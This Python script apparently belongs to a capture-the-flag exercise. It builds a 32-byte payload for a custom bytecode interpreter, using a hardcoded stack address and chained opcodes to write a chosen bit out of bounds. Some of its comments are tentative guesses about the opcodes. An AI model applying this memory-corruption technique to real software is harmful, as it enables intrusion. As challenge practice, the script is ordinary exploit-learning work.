
import struct

addr = 0x7fffffffd5a0
bytecode_addr = 0x7fffffffd5a8 # Input[8]

payload = bytearray(32)

# 0-7: Bytecode Ptr
struct.pack_into("<Q", payload, 0, bytecode_addr)

# 8: Opcode 0
payload[8] = 0x00

# 9: Opcode 0 Operand 2 Index AND Opcode 11
payload[9] = 0x0B # Index 11 -> Op2 Val = Input[11]. Opcode 11 (CMP).

# 10: Opcode 0 Operand 1 Value (Implicit Index 10)
# Dest = -0x23a. Offset -10 (0xF6).
payload[10] = 0xF6

# 11: Opcode 0 Operand 2 Value (Index 11)
# Mode = 7.
payload[11] = 0x07

# 12: Opcode 1 (Update Mode)
payload[12] = 0x01
# Opcode 1 consumes 2 args?
# Assume Input[13] and Input[14] are consumed as indices.

# 13, 14: Garbage Indices for Opcode 1
payload[13] = 0x00
payload[14] = 0x00

# 15: Opcode 8 (OR)
payload[15] = 0x08
# Opcode 8 consumes 2 args.
# Op1 Index = Input[16]. Op2 Index = Input[17].

# 16: Op1 Index for Op8
# We want Value 00 (Stack Index 0).
# Input[13] is 00.
payload[16] = 13

# 17: Op2 Index for Op8
# We want Value 01 (Bit to write).
# Input[12] is 01.
payload[17] = 12

# 18: Opcode 15 (Return)
payload[18] = 0x0F

print(payload.hex())
